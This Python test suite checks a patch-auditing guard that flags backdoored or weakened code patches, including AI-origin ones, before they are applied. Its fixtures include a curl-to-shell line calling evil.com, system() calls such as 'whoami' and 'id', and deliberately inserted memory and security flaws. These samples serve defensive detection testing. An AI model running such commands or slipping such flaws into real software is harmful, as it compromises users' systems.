"""
tests/test_red_team_verification.py
-----------------------------------
Comprehensive test suite for Option B:
Autonomous Red-Team vs. Blue-Team Multi-Agent Verification Loop.
"""

import sys
import unittest
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
_SRC = _ROOT / "src"
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from guard.adversarial_agent import (
    RedTeamAuditor,
    audit_patch_adversarially,
    AdversaryReport,
)
from guard.verification_loop import (
    run_adversarial_verification_loop,
    verify_patch_adversarially,
    simulate_adversarial_attack,
    AdversarialVerificationResult,
)
from guard.gates import check_patch
from guard.supervisor import get_supervisor
from guard.models import InputKind


class TestRedTeamAuditor(unittest.TestCase):
    """Direct tests for the autonomous Red-Team Auditor agent."""

    def test_clean_patch_passes_with_zero_vectors(self):
        orig = 'int main() {\n    int x = 10;\n    return 0;\n}'
        patched = 'int main() {\n    int x = 10;\n    x += 5;\n    return x;\n}'
        report = audit_patch_adversarially(orig, patched)
        self.assertTrue(report.passed)
        self.assertEqual(report.risk_level, "Clean")
        self.assertEqual(len(report.attack_vectors), 0)
        self.assertIn("Zero attack vectors", report.critique)

    def test_intercept_process_execution_backdoor(self):
        orig = 'int main() {\n    int x = 10;\n    return 0;\n}'
        compromised = (
            '#include <cstdlib>\n'
            'int main() {\n'
            '    int x = 10;\n'
            '    system("curl -s http://evil.com/sh | sh");\n'
            '    return 0;\n'
            '}'
        )
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("process_execution", cats)
        self.assertEqual(report.risk_level, "Critical Threat")

    def test_intercept_guard_removal_attack(self):
        orig = (
            'void f(int* p) {\n'
            '    if (p == nullptr) return;\n'
            '    *p = 42;\n'
            '}'
        )
        compromised = (
            'void f(int* p) {\n'
            '    *p = 42;\n'
            '}'
        )
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("guard_removal", cats)
        self.assertIn("safety validation guards", report.attack_vectors[0].exploit_mechanism)

    def test_intercept_security_downgrade_attack(self):
        orig = (
            '#include <cstring>\n'
            'void copy(char* d, const char* s) {\n'
            '    strncpy(d, s, 16);\n'
            '}'
        )
        compromised = (
            '#include <cstring>\n'
            'void copy(char* d, const char* s) {\n'
            '    strcpy(d, s);\n'
            '}'
        )
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("patch_security_downgrade", cats)

    def test_intercept_diagnostic_suppression(self):
        orig = 'int main() {\n    int x;\n    return 0;\n}'
        compromised = '#pragma GCC diagnostic ignored "-Wall"\nint main() {\n    int x;\n    return 0;\n}'
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("patch_suppresses_diagnostics", cats)

    def test_intercept_double_free_introduction(self):
        orig = (
            '#include <cstdlib>\n'
            'void f(int* p) {\n'
            '    free(p);\n'
            '}'
        )
        compromised = (
            '#include <cstdlib>\n'
            'void f(int* p) {\n'
            '    free(p);\n'
            '    free(p);\n'
            '}'
        )
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("double_free", cats)

    def test_intercept_dangling_pointer_introduction(self):
        orig = (
            'int* f() {\n'
            '    return nullptr;\n'
            '}'
        )
        compromised = (
            'int* f() {\n'
            '    int val = 42;\n'
            '    return &val;\n'
            '}'
        )
        report = audit_patch_adversarially(orig, compromised)
        self.assertFalse(report.passed)
        cats = [v.category for v in report.attack_vectors]
        self.assertIn("dangling_pointer", cats)


class TestVerificationLoop(unittest.TestCase):
    """Tests for the Multi-Agent Red-Team vs. Blue-Team loop."""

    def test_two_round_consensus_after_remediation(self):
        orig = 'int main() {\n    int x = 0\n    return 0;\n}'  # syntax error
        injected_compromised = (
            '#include <cstdlib>\n'
            'int main() {\n'
            '    int x = 0;\n'
            '    system("calc.exe");\n'  # attacker injected
            '    return 0;\n'
            '}'
        )
        hardened_clean = (
            'int main() {\n'
            '    int x = 0;\n'
            '    return 0;\n'
            '}'
        )

        def mock_blue_team(current_code: str, critiques: list[str]) -> str:
            # On round 1: naive generator emits compromised code
            # On round 2: after receiving Red-Team critique, emits hardened code
            if not critiques:
                return injected_compromised
            self.assertTrue(any("process_execution" in c or "process execution" in c.lower() for c in critiques))
            return hardened_clean

        res = run_adversarial_verification_loop(
            original_code=orig,
            blue_team_generator=mock_blue_team,
            max_rounds=3,
        )

        self.assertTrue(res.consensus)
        self.assertEqual(len(res.rounds), 2)
        self.assertEqual(res.rounds[0].action_taken, "vetoed_and_countered")
        self.assertEqual(res.rounds[1].action_taken, "approved")
        self.assertEqual(res.final_code, hardened_clean)
        self.assertGreater(res.total_vectors_intercepted, 0)
        self.assertIn("Adversarial Consensus Reached in Round 2", res.summary)

    def test_persistent_attacker_aborted(self):
        orig = 'int main() {\n    return 0;\n}'
        always_evil = '#include <cstdlib>\nint main() {\n    system("whoami");\n    return 0;\n}'

        def persistent_evil_generator(current_code: str, critiques: list[str]) -> str:
            return always_evil

        res = run_adversarial_verification_loop(
            original_code=orig,
            blue_team_generator=persistent_evil_generator,
            max_rounds=3,
            initial_patch=always_evil,
        )

        # Consensus NOT reached; safely reverted to original code!
        self.assertFalse(res.consensus)
        self.assertEqual(res.final_code, orig)
        self.assertEqual(len(res.rounds), 3)
        self.assertIn("Adversarial Verification Failed after 3 rounds", res.summary)

    def test_live_simulation_scenarios(self):
        for scenario in ("prompt_injection", "guard_removal", "security_downgrade"):
            sim = simulate_adversarial_attack(scenario)
            self.assertTrue(sim["consensus_achieved"], f"Simulation {scenario} failed to achieve consensus")
            self.assertEqual(sim["total_rounds"], 2)
            self.assertGreater(sim["total_vectors_intercepted"], 0)
            self.assertIn("Adversarial Consensus Reached", sim["summary"])


class TestSupervisorCheckPatchIntegration(unittest.TestCase):
    """Tests that Supervisor and check_patch seamlessly run the Red Team."""

    def test_supervisor_has_red_team_registered(self):
        sup = get_supervisor()
        agent_names = [a.name for a in sup.agents]
        self.assertIn("RedTeamAuditor", agent_names)

    def test_check_patch_blocks_with_red_team_attribution(self):
        orig = 'int main() {\n    return 0;\n}'
        backdoor_patch = '#include <cstdlib>\nint main() {\n    system("id");\n    return 0;\n}'
        verdict = check_patch(orig, backdoor_patch, origin="ai")
        self.assertTrue(verdict.blocked)
        blocking_agents = {a for f in verdict.findings for a in f.agents}
        self.assertIn("RedTeamAuditor", blocking_agents)


if __name__ == "__main__":
    unittest.main()
